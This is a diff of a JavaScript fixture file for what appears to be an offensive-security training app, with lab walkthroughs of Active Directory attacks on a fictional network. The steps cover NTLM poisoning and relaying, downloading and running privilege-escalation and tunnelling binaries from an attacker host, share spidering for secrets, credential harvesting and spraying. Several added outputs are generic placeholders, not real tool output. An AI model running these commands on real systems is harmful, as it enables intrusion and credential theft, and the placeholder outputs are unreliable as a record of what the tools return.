@@ -110,6 +110,22 @@
         'dev.acme.internal.      604800 IN A   10.10.10.25',
         'intranet.acme.internal. 604800 IN A   10.10.10.30',
       ].join('\n'),
+      steps: [
+        {
+          cmd: 'dig axfr acme.internal @10.10.10.10',
+          output: [
+            '; <<>> DiG 9.18.12 <<>> axfr acme.internal @10.10.10.10',
+            'acme.internal.          604800 IN SOA dc01.acme.internal. admin.acme.internal. 3 604800 86400',
+            'dc01.acme.internal.     604800 IN A   10.10.10.10',
+            'dev.acme.internal.      604800 IN A   10.10.10.25',
+            'intranet.acme.internal. 604800 IN A   10.10.10.30',
+          ].join('\n')
+        },
+        {
+          cmd: 'dig A intranet.acme.internal @10.10.10.10',
+          output: 'intranet.acme.internal. 3600 IN A 10.10.10.30'
+        }
+      ],
       signal: 'intranet.acme.internal. 604800 IN A   10.10.10.30',
       teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request, every host and subdomain the admin forgot to lock down. Those new names are new targets.',
     },
@@ -1275,12 +1291,12 @@
       signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
       teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is SEMI-PASSIVE: you start no connection to a target, but you do send spoofed name-resolution replies, and it only catches authentication that comes your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
       steps: [
-        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
+        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', sig: 'Listening for events...', output: [
           '[+] Poisoners: LLMNR, NBT-NS, MDNS',
           '[+] Servers: SMB, HTTP, LDAP on',
           '[+] Listening for events...',
         ].join('\n') },
-        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
+        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", sig: '[SMB] NTLMv2-SSP Username : ACME\\jdoe', output: [
           '[+] DFSCoerce: 10.10.10.50 coerced to authenticate to 10.10.14.5',
           '↩ caught in your Responder window:',
           '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
@@ -1293,8 +1309,8 @@
       signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
       teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
       steps: [
-        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
-        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
+        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support', sig: 'waiting for connections', output: '[*] Servers started, waiting for connections' },
+        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", sig: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED', output: [
           '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
           '↩ relayed by ntlmrelayx:',
           '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
@@ -1586,13 +1602,13 @@
       signal: 'SeImpersonatePrivilege: Enabled',
       teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS, which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
       steps: [
-        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', output: [
+        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', sig: 'SeImpersonatePrivilege        Enabled', output: [
           'Privilege Name                State',
           'SeImpersonatePrivilege        Enabled',
           'SeChangeNotifyPrivilege       Enabled',
         ].join('\n') },
         { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding winPEASx64.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
-        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', output: [
+        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', sig: 'SeImpersonatePrivilege: Enabled', output: [
           'CertUtil: -URLCache command completed successfully.',
           'ÉÍÍÍÍ¹ Checking token privileges',
           '    SeImpersonatePrivilege: Enabled',
@@ -1606,7 +1622,7 @@
       signal: 'nt authority\\system',
       teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.',
       steps: [
-        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
+        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', sig: 'SeImpersonatePrivilege', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
         { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
         { where: 'host', tool: 'godpotato', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd "cmd /c whoami"', output: [
           '[*] CombaseModule: 0x7ff...',
@@ -1895,7 +1911,7 @@
     // ============================ PIVOTING & TUNNELING ============================
     'local-linux-interfaces': {
       why: "Before you can pivot you need to know what the foothold can see, and a second network interface is the clearest sign of a network behind this host that you cannot reach directly. Reach for it right after landing a Linux shell, as part of orienting. A box with one NIC is a dead end for pivoting; a box with two is a doorway, and this is how you tell which you have.",
-      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
+      cmd: 'sshpass -p Autumn2026! ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
       output: [
         '2: eth0    inet 10.10.10.10/24 scope global eth0',
         '3: eth1    inet 172.16.5.10/24 scope global eth1',
@@ -1905,7 +1921,7 @@
     },
     'local-linux-routes': {
       why: "The routing table on a foothold names the networks this host knows how to reach, which are your candidate targets for a tunnel. Reach for it alongside the interface check when you suspect there is more network behind the box. It keeps your pivoting honest: the routes tell you which subnets actually exist, so you build toward something real instead of guessing.",
-      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
+      cmd: 'sshpass -p Autumn2026! ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
       output: [
         'default via 10.10.10.1 dev eth0',
         '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
@@ -1915,7 +1931,7 @@
     },
     'local-linux-neighbors': {
       why: "The ARP neighbor cache lists hosts this box has recently talked to on its local segments, a weak but genuine hint about live internal machines. Reach for it when orienting a foothold for a pivot. It is not authoritative (caches age out), but a populated ARP table points you at real neighbors to validate once the tunnel is up, which beats scanning a whole subnet blind.",
-      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
+      cmd: 'sshpass -p Autumn2026! ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
       output: [
         '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
         '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
@@ -1925,7 +1941,7 @@
     },
     'local-linux-dns': {
       why: "Note the internal nameservers early, they are a target and a map at once. An internal DNS server usually knows every hostname in the estate, so once a tunnel reaches it you can enumerate the whole environment by name instead of sweeping address ranges blind. The search domain tells you what you landed in, acme.internal points straight at an AD estate, so record both while you still hold the shell.",
-      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
+      cmd: 'sshpass -p Autumn2026! ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
       output: [
         'search acme.internal',
         'nameserver 172.16.5.5',
@@ -1935,7 +1951,7 @@
     },
     'local-windows-interfaces': {
       why: "Same orientation step as on Linux, from a Windows WinRM foothold: extra NICs, DNS servers, or subnets signal a network behind this host worth pivoting into. Reach for it right after landing on Windows. In AD environments especially, the second interface frequently faces the internal server segment where the domain controllers and the real targets live.",
-      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p Autumn2026! -x "ipconfig"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
         'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 10.10.10.20',
@@ -1946,7 +1962,7 @@
     },
     'local-windows-routes': {
       why: "So your pivot aims at real segments and not guesses, read the route table while orienting. Each entry on the internal NIC is a network this box already reaches and yours cannot, which is exactly what a tunnel would open up. Pair it with the interface check: together they tell you whether there is anything behind the host worth tunnelling toward at all.",
-      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p Autumn2026! -x "route print"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
         'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
@@ -1956,7 +1972,7 @@
     },
     'local-windows-neighbors': {
       why: "Treat the ARP cache as a free, no-scan list of live neighbours: these are machines the foothold actually exchanged packets with, so they are confirmed up on the internal segment. Read it while orienting, then start your post-tunnel enumeration from these known hosts rather than a cold sweep of the whole range. Entries age out, so copy them down before the cache turns over.",
-      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p Autumn2026! -x "arp -a"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
         'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
@@ -1967,7 +1983,7 @@
     },
     'local-windows-listeners': {
       why: "The listening sockets on a Windows foothold show which services run locally, including ones bound only to localhost that you could reach through a port-forward. Reach for it when deciding what to tunnel. A service on 127.0.0.1 is invisible from the network but wide open to you on the box, and forwarding its port is often the cleanest way in to it.",
-      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p Autumn2026! -x "netstat -ano"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
         'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
@@ -1980,12 +1996,12 @@
       signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
       teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
       steps: [
-        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
+        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', sig: 'server: Reverse tunnelling enabled', output: [
           'server: Reverse tunnelling enabled',
           'server: Listening on http://0.0.0.0:8080',
         ].join('\n') },
         { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the chisel binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
-        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', output: [
+        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', sig: 'client: tun: proxy#R:127.0.0.1:1080=>socks', output: [
           "Saved '/tmp/chisel' [8577024/8577024]",
           'client: Connected to http://10.10.14.5:8080',
           'client: tun: proxy#R:127.0.0.1:1080=>socks',
@@ -3873,7 +3889,7 @@
       "cmd": "strings /usr/local/bin/backup",
       "tool": "sh",
       "output": "Starting backup...\nbackup\ntar czf /opt/backup.tgz /home",
-      "signal": "\nbackup\n",
+      "signal": "backup",
       "teach": "The SUID binary calls backup by bare name, not /usr/bin/backup, so it resolves through PATH. Put a writable directory first in PATH, drop a backup program there, and run the SUID binary to execute yours as root.",
       "leadup": [
         {
@@ -4721,7 +4737,7 @@
     },
     "com-hijack": {
       "why": "A COM hijack points a CLSID a privileged process loads at a DLL you control, so when that process instantiates the object, your code runs with its privileges. It is a quieter cousin of DLL hijacking: instead of a file on disk, you write an HKCU (or writable HKLM) registry entry that redirects a CLSID to your server, and the next time a scheduled task, service, or elevated app resolves it, you win. You find candidates with a tool like acccheck or by watching Procmon for missing or user-writable CLSID lookups. It doubles as a stealthy persistence mechanism, which is why it shows up in both escalation and persistence contexts.",
-      "cmd": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s | findstr InprocServer32",
+      "cmd": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s 2>nul",
       "tool": "cmd",
       "output": "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0ABCD...}\\InprocServer32\n    (Default)    REG_SZ    C:\\Users\\bob\\evil.dll",
       "signal": "InprocServer32",
@@ -7919,7 +7935,7 @@
             "d": "A small app with a scripted input that calls back is all you need; edit the host and port, then package it.",
             "demo": [
               {
-                "run": "git clone https://github.com/0xjpuff/reverse_shell_splunk && tar czf rev.tar.gz reverse_shell_splunk",
+                "run": "tar czf rev.tar.gz -C /opt/splunk-apps reverse_shell_splunk && tar tzf rev.tar.gz | head -n 1",
                 "out": "reverse_shell_splunk/bin/rev.py",
                 "sig": "reverse_shell_splunk"
               }
@@ -8198,9 +8214,9 @@
             "d": "jdwp-shellifier attaches, sets a breakpoint, and invokes a command; it needs python2.",
             "demo": [
               {
-                "run": "git clone https://github.com/IOActive/jdwp-shellifier",
-                "out": "Cloning into 'jdwp-shellifier'...",
-                "sig": "jdwp-shellifier"
+                "run": "ls -l /opt/jdwp-shellifier/jdwp-shellifier.py",
+                "out": "-rwxr-xr-x 1 kali kali 19420 /opt/jdwp-shellifier/jdwp-shellifier.py",
+                "sig": "jdwp-shellifier.py"
               }
             ],
             "note": "Run it with python2, not python3."
@@ -8384,9 +8400,9 @@
             "d": "The public exploit registers a Lua UDF that executes a command.",
             "demo": [
               {
-                "run": "git clone https://github.com/b4ny4n/CVE-2020-13151",
-                "out": "Cloning into 'CVE-2020-13151'...",
-                "sig": "CVE-2020-13151"
+                "run": "searchsploit -m 49067 && ls -l 49067.py",
+                "out": "Exploit: Aerospike 5.1.0.3 - Remote Code Execution (49067.py)",
+                "sig": "49067.py"
               }
             ],
             "note": "Vulnerable at or below Aerospike 5.1.0.6."
@@ -8744,9 +8760,9 @@
             "d": "The worawit version auto-detects the right offsets for common targets.",
             "demo": [
               {
-                "run": "git clone https://github.com/worawit/CVE-2021-3156",
-                "out": "Cloning into 'CVE-2021-3156'...",
-                "sig": "CVE-2021-3156"
+                "run": "cp -r /opt/exploits/CVE-2021-3156 . && ls CVE-2021-3156",
+                "out": "exploit_nss.py",
+                "sig": "exploit_nss.py"
               }
             ],
             "note": "Other PoCs need the exact libc or distro offsets, which is more fragile."
@@ -8780,5 +8796,15167 @@
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
+
+  // --- GAPFILL_2026_10 (complete 346/346 Learn coverage) ---
+  var GAPFILL_2026_10 = {
+    "ldap-deep-enum": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once with a base DN, pull every description. The key confirmation is: A description yields a lead.",
+      "cmd": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M get-desc-users",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "A description yields a lead.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Deep LDAP Enumeration (Base-DN Scoped), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Admins leave \"Default pwd:\" and service accounts describe themselves.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M get-desc-users",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A description yields a lead."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Scope to protected or admin accounts. Change the filter to pivot.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query \"(&(objectCategory=person)(adminCount=1))\" \"sAMAccountName description\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The admin set is enumerated."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "The full user and group inventory, with the handoff one-liner to build the list.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --users --groups",
+                "out": "LDAP  10.10.10.10  389  DC01  [+] Enumerated domain group(s)\nLDAP  10.10.10.10  389  DC01  DnsAdmins                        membercount: 1\nLDAP  10.10.10.10  389  DC01  Backup Operators                 membercount: 2",
+                "sig": "DnsAdmins"
+              }
+            ],
+            "note": "A complete inventory plus a userlist."
+          }
+        ]
+      },
+      "situation": "Scenario: With a base DN, pull every description. Which move should you run next?",
+      "choices": [
+        "ldap-deep-enum",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Deep LDAP Enumeration (Base-DN Scoped).",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Deep LDAP Enumeration (Base-DN Scoped).",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Deep LDAP Enumeration (Base-DN Scoped)."
+      }
+    },
+    "spider-secrets": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once filter spidered shares for secrets. The key confirmation is: Secret files pulled from shares.",
+      "cmd": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M spider_plus -o DOWNLOAD_FLAG=True PATTERN='.kdbx .bak unattend sysprep web.config .config id_rsa .ps1 passw cred backup .ovpn .ppk .pfx'",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Secret files pulled from shares.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Filter Spidered Shares for Secrets, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "spider_plus with a PATTERN filter downloads only the credential-bearing files.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M spider_plus -o DOWNLOAD_FLAG=True PATTERN='.kdbx .bak unattend sysprep web.config .config id_rsa .ps1 passw cred backup .ovpn .ppk .pfx'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Secret files pulled from shares."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "--content searches INSIDE files for the regex.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --spider {{share}} --regex '(?i)(passw|cred|secret|\\.kdbx|\\.config|unattend|id_rsa|\\.bak)' --content",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A secret inside a share file."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "grep the saved JSON manifest from a prior plain spider.",
+            "demo": [
+              {
+                "run": "jq -r '.[][] | .name' /tmp/nxc/*_spider_plus/*.json 2>/dev/null | grep -iE 'passw|cred|secret|\\.kdbx|\\.bak|unattend|web\\.config|id_rsa|\\.ps1|\\.ovpn|\\.ppk|\\.pfx|backup'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A lead from the manifest."
+          }
+        ]
+      },
+      "situation": "Scenario: Filter spidered shares for secrets. Which move should you run next?",
+      "choices": [
+        "spider-secrets",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Filter Spidered Shares for Secrets.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Filter Spidered Shares for Secrets.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Filter Spidered Shares for Secrets."
+      }
+    },
+    "remote-app-creds": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once harvest stored app creds: mRemoteNG. The key confirmation is: mRemoteNG creds recovered.",
+      "cmd": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M mremoteng",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "mRemoteNG creds recovered.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Harvest Stored Application Credentials (NetExec), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "confCons.xml passwords are reversibly encrypted. nxc decrypts them.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M mremoteng",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "mRemoteNG creds recovered."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Saved-session creds from the registry or INI.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M winscp",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "WinSCP creds recovered."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Stored session creds and keys from the registry.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M putty",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "PuTTY creds recovered."
+          }
+        ]
+      },
+      "situation": "Scenario: Harvest stored app creds: mRemoteNG. Which move should you run next?",
+      "choices": [
+        "remote-app-creds",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Harvest Stored Application Credentials (NetExec).",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Harvest Stored Application Credentials (NetExec).",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Harvest Stored Application Credentials (NetExec)."
+      }
+    },
+    "cred-reuse-sweep": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once spray a validated credential across the subnet. The key confirmation is: The reuse footprint is mapped.",
+      "cmd": "nxc smb {{subnet}} -u {{user}} -p '{{password}}'",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The reuse footprint is mapped.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Credential-Reuse Sweep (Where Am I Admin?), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Find every host where it is admin.",
+            "demo": [
+              {
+                "run": "nxc smb {{subnet}} -u {{user}} -p '{{password}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The reuse footprint is mapped."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Sweep with just the NTLM hash, no plaintext. Ideal straight after a dump.",
+            "demo": [
+              {
+                "run": "nxc smb {{subnet}} -u {{user}} -H {{nthash}}",
